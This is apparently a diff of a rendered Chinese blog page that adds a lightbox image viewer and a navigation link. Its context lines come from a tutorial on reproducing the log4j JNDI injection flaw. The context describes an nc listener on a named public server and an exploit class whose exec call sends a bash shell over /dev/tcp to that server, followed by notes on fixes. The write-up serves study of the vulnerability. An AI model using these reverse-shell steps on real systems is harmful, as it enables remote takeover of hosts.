@@ -33,7 +33,18 @@ var _hmt = _hmt || [];
 </script>
 <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-DYETCPM289"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&gtag("event","search",{search_term:this.value})}),"undefined"!=typeof location$&&location$.subscribe(function(e){gtag("config","G-DYETCPM289",{page_path:e.pathname})})})</script>
 <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-DYETCPM289"></script>
-</head>
+<link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+            html.glightbox-open { overflow: initial; height: 100%; }
+            .gslide-title { margin-top: 0px; user-select: text; }
+            .gslide-desc { color: #666; user-select: text; }
+            .gslide-image img { background: white; }
+            
+                .gscrollbar-fixer { padding-right: 15px; }
+                .gdesc-inner { font-size: 0.75rem; }
+                body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
+                body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
+                body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}
+                </style><script src="../../../assets/javascripts/glightbox.min.js"></script></head>
 <body data-md-color-accent="" data-md-color-primary="" data-md-color-scheme="default" dir="ltr">
 <script src="../../../js/scheme.js" type="text/javascript"></script>
 <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)</script>
@@ -560,6 +571,11 @@ var _hmt = _hmt || [];
 </li>
 </ul>
 </nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../cs/system/pa/">
+        ICS PA 实验纪实
+      </a>
 </li>
 </ul>
 </nav>
@@ -1703,7 +1719,7 @@ var _hmt = _hmt || [];
 注意因为是高版本 JDK，所以需要手动开启 com.sun.jndi.ldap.object.trustURLCodebase 选项。
 <h4 id="_2">复现攻击<a class="headerlink" href="#_2" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h4>
 <p>前面已经正常开启了<span class="heti-skip"><span class="heti-spacing"> </span>LDAP<span class="heti-spacing"> </span></span>服务，所以漏洞应用运行时可以直接加载到<span class="heti-skip"><span class="heti-spacing"> </span>Exploit<span class="heti-spacing"> </span></span>类，执行其中静态代码。因为其中通过<span class="heti-skip"><span class="heti-spacing"> </span>exec<span class="heti-spacing"> </span></span>执行了<span class="heti-skip"><span class="heti-spacing"> </span>open /System/Applications/Calculator.app<span class="heti-spacing"> </span></span>命令，所以会弹出计算器应用。
-<img alt="" src="/assets/images/cs/web/log4j_vuln/ldap_calc.png"/></p>
+<a class="glightbox" data-desc-position="bottom" data-height="auto" data-width="80%" href="/assets/images/cs/web/log4j_vuln/ldap_calc.png"><img alt="" src="/assets/images/cs/web/log4j_vuln/ldap_calc.png"/></a></p>
 <p>可以看到<span class="heti-skip"><span class="heti-spacing"> </span>LDAP<span class="heti-spacing"> </span></span>服务端输出了一条发送<span class="heti-skip"><span class="heti-spacing"> </span>LDAP<span class="heti-spacing"> </span></span>引用的语句，说明<span class="heti-skip"><span class="heti-spacing"> </span>log4j<span class="heti-spacing"> </span></span>应用确实连接了<span class="heti-skip"><span class="heti-spacing"> </span>LDAP<span class="heti-spacing"> </span></span>服务端并获取了<span class="heti-skip"><span class="heti-spacing"> </span>Exploit.class<span class="heti-spacing"> </span></span>类文件。而且因为其中的静态代码通过<span class="heti-skip"><span class="heti-spacing"> </span>exec<span class="heti-spacing"> </span></span>执行了<span class="heti-skip"><span class="heti-spacing"> </span>open /System/Applications/Calculator.app<span class="heti-spacing"> </span></span>命令，所以看到弹出了计算器，说明了这个静态代码确实被执行了。这也就复现了这个漏洞。</p>
 <p>接下来更换一下<span class="heti-skip"><span class="heti-spacing"> </span>exec<span class="heti-spacing"> </span></span>执行的命令，来实现反弹终端。</p>
 <p>首先在远程公网服务器（<span>ip<span class="heti-spacing"> </span></span>是<span><span class="heti-spacing"> </span>47.103.43.32</span>）通过<span class="heti-skip"><span class="heti-spacing"> </span>nc -lnvvp 7777<span class="heti-spacing"> </span></span>在<span class="heti-skip"><span class="heti-spacing"> </span>7777<span class="heti-spacing"> </span></span>端口监听，用来捕获反弹的终端。然后更改攻击类代码：
@@ -1711,7 +1727,7 @@ var _hmt = _hmt || [];
 <a href="#__codelineno-3-2" id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmds</span><span class="p">).</span><span class="na">waitFor</span><span class="p">();</span><span class="w"></span>
 </code></pre></div>
 即通过 /dev/tcp 设备将 bash 的输入输出流重定向到公网服务器上，实现 get shell。运行 log4j 漏洞应用：
-<img alt="" src="/assets/images/cs/web/log4j_vuln/ldap_getshell.png"/>
+<a class="glightbox" data-desc-position="bottom" data-height="auto" data-width="80%" href="/assets/images/cs/web/log4j_vuln/ldap_getshell.png"><img alt="" src="/assets/images/cs/web/log4j_vuln/ldap_getshell.png"/></a>
 <p>由图可以看出，远程服务器已经连接上了当前运行<span class="heti-skip"><span class="heti-spacing"> </span>log4j<span class="heti-spacing"> </span></span>漏洞应用的<span class="heti-skip"><span class="heti-spacing"> </span>macOS<span class="heti-spacing"> </span></span>主机。</p>
 <h4 id="_3">调用栈分析<a class="headerlink" href="#_3" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h4>
 <p>通过调试运行<span class="heti-skip"><span class="heti-spacing"> </span>log4j<span class="heti-spacing"> </span></span>漏洞应用可以获取到整个程序的调用栈：
@@ -1784,7 +1800,7 @@ var _hmt = _hmt || [];
 <a href="#__codelineno-6-12" id="__codelineno-6-12" name="__codelineno-6-12"></a><span class="p">}</span><span class="w"></span>
 </code></pre></div>
 运行发现计算器已被调出：
-<img alt="" src="/assets/images/cs/web/log4j_vuln/rmi_calc.jpg"/>
+<a class="glightbox" data-desc-position="bottom" data-height="auto" data-width="80%" href="/assets/images/cs/web/log4j_vuln/rmi_calc.jpg"><img alt="" src="/assets/images/cs/web/log4j_vuln/rmi_calc.jpg"/></a>
 <h2 id="log4j_6"><span>log4j<span class="heti-spacing"> </span></span>漏洞修复<a class="headerlink" href="#log4j_6" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
 <p>高版本的<span class="heti-skip"><span class="heti-spacing"> </span>JDK<span class="heti-spacing"> </span></span>中设置了<span class="heti-skip"><span class="heti-spacing"> </span>com.sun.jndi.xxx.object.trustURLCodebase<span class="heti-spacing"> </span></span>默认为<span><span class="heti-spacing"> </span>false</span>，这可以防止一部分<span class="heti-skip"><span class="heti-spacing"> </span>JNDI<span class="heti-spacing"> </span></span>注入的发生。</p>
 <p>在<span class="heti-skip"><span class="heti-spacing"> </span>CVE-2021-42288<span class="heti-spacing"> </span></span>发布后，<span>Apache<span class="heti-spacing"> </span></span>通过<span class="heti-skip"><span class="heti-spacing"> </span>#608<span class="heti-spacing"> </span></span>这个<span class="heti-skip"><span class="heti-spacing"> </span>pull request<span class="heti-spacing"> </span></span>来对<span class="heti-skip"><span class="heti-spacing"> </span>LDAP<span class="heti-spacing"> </span></span>进行了限制，并发布了<span class="heti-skip"><span class="heti-spacing"> </span>2.15.0-rc1<span class="heti-spacing"> </span></span>版本。但这个版本仍存在绕过方式，即通过构造出会抛出异常的<span class="heti-skip"><span class="heti-spacing"> </span>payload<span class="heti-spacing"> </span></span>就可以绕过检验。</p>
@@ -1915,5 +1931,5 @@ var _hmt = _hmt || [];
 <script src="../../../assets/javascripts/bundle.289a2a4b.min.js"></script>
 <script src="https://cdn.tonycrane.cc/utils/katex.min.js"></script>
 <script src="../../../js/katex.js"></script>
-</body>
+<script>document$.subscribe(() => {const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});})</script></body>
 </html>
